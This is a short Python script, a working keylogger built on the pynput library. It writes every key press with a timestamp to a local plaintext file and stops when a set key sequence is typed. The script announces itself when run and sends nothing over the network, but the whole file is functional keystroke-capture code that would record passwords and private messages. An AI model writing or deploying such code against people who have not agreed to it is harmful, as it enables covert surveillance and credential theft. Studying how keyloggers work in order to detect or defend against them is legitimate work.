from pynput import keyboard
import datetime

file_log = "flog.txt"
exit_code = ['Key.esc', 'a', 'b', 'c']
seq = []

def pressedkey(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)

    # Log the key to a file
    with open(file_log, "a") as f:
        f.write(f"{datetime.datetime.now()} - {k}\n")

    # Maintain rolling sequence
    seq.append(k)
    if len(seq) > len(exit_code):
        seq.pop(0)

    # Check exit code sequence
    if seq == exit_code:
        print("Exit sequence detected. Stopping keylogger.")
        return False  # Stops the listener

# Start listening
with keyboard.Listener(on_press=pressedkey) as log:
    print("Keylogger started. Press Esc -> a -> b -> c to stop.")
    log.join()
